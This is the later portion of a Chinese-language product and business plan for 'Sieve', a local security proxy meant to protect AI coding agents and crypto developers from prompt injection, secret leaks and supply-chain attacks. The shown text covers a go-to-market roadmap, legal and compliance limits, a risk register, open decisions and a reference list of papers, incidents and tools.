- 第一篇技术深度博文:Sieve 架构剖析
- Twitter / 即刻 / V2EX / Hacker News 同步发布
- Discord / Telegram 社群

**完成定义**:
- GitHub stars > 500
- 周活用户 > 100
- 第一波付费用户 > 10

### 10.5 第 9-12 周:商业化 + 生态

**交付物**:
- Pro 版正式上线(Stripe 接入)
- Crypto 版规则集完成 P0-P1
- 与 1-2 家 crypto 安全 KOL 建立联系(Chaofan Shou / @Fried_rice、SlowMist @evilcos)
- 与 Anthropic / Cursor / Continue 等接洽技术合作或文档推荐
- 第二篇内容:Drainer 攻击模式深度剖析
- 第三篇内容:LiteLLM 事件复盘 + Sieve 怎么防(强营销)

**完成定义**:
- MRR > $2K
- 至少 1 个 KOL 推荐
- 至少 1 篇文章被 The Block / CoinDesk / Decrypt / Hacker News 头条转载

---

## 11. 法律与合规边界

### 11.1 Sieve 不承诺

- 不承诺 100% 检测率(Lakera 自报 98% 都因话术过满吃过反弹)
- 不承诺对未知 0day prompt injection 有效
- 不承诺对 APT 级攻击(DPRK Lazarus 等)有效
- 不承诺 AC-2 secret leak 100% 防住(secret 走 request body 明文,client-side 无法根治)

### 11.2 ToS 关键条款

- 用户使用 Sieve 不构成法律免责——损失自担
- Sieve 不存储、不传输、不分析用户 prompt 内容
- 规则库更新仅下载,不上传
- 用户主动提交样本需明确同意,且本地脱敏

### 11.3 开源 / 闭源策略

- **核心引擎开源(MIT)**——透明可审计,这是对 Blockaid/GoPlus 的关键优势
- **高级规则集闭源**(Pro/Crypto 版)——数据壁垒
- **Slither subprocess 调用**——避开 AGPLv3 传染
- 二进制发布做 sigstore 签名 + reproducible build,可被验证

### 11.4 数据合规

- **GDPR**:零数据采集,不适用
- **个保法**:零数据采集,不适用
- **跨境数据流转**:零数据采集,不涉及
- **完全本地是巨大商业杠杆**——可全球卖,无地区版本

### 11.5 商标

- codename Sieve 暂用,正式发布前换名
- 已知冲突:sieve.ai (YC W22)、SIEVE 缓存算法、sieve YC W25、Thunderbird Sieve、Brazilian Sieve
- 候选正式名:Airlock / Airgap(待 doskey 拍板 + 域名查询)

---

## 12. 风险登记册

| 风险 | 概率 | 影响 | 缓解 |
|-----|------|------|-----|
| GoPlus AgentGuard 升级到 LLM 流量层 | 高(6-12 月内) | 高 | 抢生态位 + 主流编码客户端官方推荐 |
| Blockaid 推 *Blockaid for Coding Agents* | 中(12-18 月) | 高 | 完全本地 + 开源核心引擎差异化 |
| Anthropic / OpenAI 默认集成第三方安全 | 中(18-24 月) | 极高 | 与 Anthropic 早期建立合作关系 |
| Slither AGPLv3 法律纠纷 | 低 | 中 | subprocess 隔离 + 法律咨询 |
| Sieve 自身被供应链攻击 | 低 | 极高 | sigstore + reproducible + pinned deps |
| 误报率失控用户流失 | 中 | 高 | 三级置信度 + 学习型白名单 + 持续 benchmark |
| 法律风险(被告做"未授权拦截") | 低 | 中 | 用户明确知情 + 本地运行 + 不落地数据 |
| 中转站爆料文章引法律纠纷 | 中 | 中 | 用 honeypot 钱包测试 + 学术引用方法论 + 匿名化中转站名 |
| 加密圈 KOL 不买账 | 中 | 中 | 提前与 Chaofan Shou / SlowMist 建立关系 |
| doskey 个人时间不够 | 中 | 高 | bouncer 业务可外包部分(规则审核、内容运营),核心代码本人写 |

---

## 13. 与 doskey 其他业务的咬合

| 业务 | 与 Sieve 的咬合 |
|------|----------------|
| **AI 智能合约审计 bounty** | Sieve 的 ContractAuditor 模块就是 bounty 工作的副产品工具化——双向喂养,一边赚 bounty,一边把发现的攻击模式沉淀为产品规则 |
| **YoctoClaw**(本地 agent 框架) | 天然需要 Sieve 这种安全层做配套,可作为 reference integration |
| **跨境 OTC 研究** | RedotPay、StraitsX、BIN sponsorship 经验 + 合规审计能力,在给协议方做"AI 时代开发流程审计报告"时直接复用 |
| **个人品牌** | 从"管理者"翻篇成"AI × Crypto 安全研究者 + 产品 builder"——这是 2026 年最值钱的人设之一 |

---

## 14. Open Questions(需要 doskey 后续决策)

1. **正式产品名**:Airlock vs Airgap vs 其他?何时定?
2. **MVP 优先适配哪个客户端**:Claude Code / Cursor / 通用代理三选一?
3. **冷启动文章角度**:中转站揭黑(攻击性强)/ Samsung 复盘(专业)/ 自己差点泄漏的故事(亲和)三选一?
4. **是否做开源核心**:MIT 开源吸引开发者,但部分核心检测算法(尤其 Crypto 专项)是否保留商业版?
5. **是否引入投资**:目前判断一人公司可以独立跑,但若想加速做大需要早期天使?
6. **法律实体**:在哪国注册公司?(影响 ToS、合规、税务、收款方式)
7. **中文市场策略**:即刻 + V2EX 优先 vs Twitter 中文圈优先?
8. **威胁情报采购预算**:第几个月开始上 ScamSniffer Pro $999/月?

---

## 15. 附录:关键数据源与参考

### 15.1 学术论文

- *Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain* (UCSB+Fuzzland+WLF, arXiv:2604.08407, 2026-04) — Sieve thesis 级依据
- *Blockchain Address Poisoning* (arXiv:2501.16681, 2025) — 地址替换检测算法依据
- *PromptShield: Deployable Detection for Prompt Injection Attacks* (arXiv:2501.15145) — 低 FPR 评估范式
- *Trojan Source: Invisible Vulnerabilities* (USENIX Security '23, arXiv:2111.00169) — Unicode 攻击防御
- *A Comparative Study of Software Secrets Reporting by Secret Detection Tools* (NCSU, arXiv:2307.00714, ESEM '23) — secret 检测精度基准

### 15.2 行业报告

- GitGuardian *State of Secrets Sprawl Report 2025* — 2024 年 GitHub 公开 commit 检测到 2377 万新泄漏
- SlowMist *2024 Blockchain Security and AML Annual Report* — drainer 攻击数据
- Anthropic *Constitutional Classifiers* — jailbreak 防御基准

### 15.3 相关攻击事件

- LiteLLM 1.82.7/1.82.8 PyPI 投毒(2026-03-24,via Trivy 供应链)
- @solana/web3.js 1.95.6/1.95.7 投毒(2024-12-02)
- North Korea Contagious Interview campaign(2025-07~2026-04,670+ 恶意 npm 包)
- TeamPCP Trivy / KICS / LiteLLM 三连击(2026-03)
- Pink Drainer EIP-712 数字化 verifyingContract 绕过(2024-2025,累计 tens of millions)

### 15.4 关键开源项目(参考实现)

- gitleaks / TruffleHog / detect-secrets — secret 检测
- Slither (AGPLv3) — Solidity 静态分析,subprocess 调用
- 4byte.directory / Sourcify — calldata signature 库
- Cloudflare Pingora — Rust 反向代理参考
- Meta Llama-Prompt-Guard-2-22M — 本地 prompt injection 检测
- StepSecurity Harden-Runner — eBPF 安全代理范式参考

### 15.5 关键人/团队联系

- **Chaofan Shou (@Fried_rice)** — UCSB 论文一作,Fuzzland CTO,Solayer Labs,bounty $1.9M。**Sieve 应主动接洽,可能成为顾问/天使**
- **Yu Feng** — UCSB 教授,Fuzzland 联创,论文通讯
- **Ryan Jingyang Fang** — WLF Head of Growth,论文共著者,主导 AgentPay SDK
- **慢雾 @evilcos** — 中文圈 crypto 安全 KOL,已开源 misttrack-skills 等三个仓库,持续发力 AI 安全

---

## 文档结束

> **核心一句话**:Sieve 在技术上能跑通,Crypto 专项 + 本地代理 + LLM 流量层 + 双向检测的四点组合是真护城河,但执行窗口只有 12-18 个月,慢半拍就被 GoPlus 或 Blockaid 吃掉。这不是 PoC 阶段的不确定问题,是执行速度和生态站位的工程项目管理问题。
>
> — *基于 doskey 与 Claude 的完整对话整理,2026-04-26*
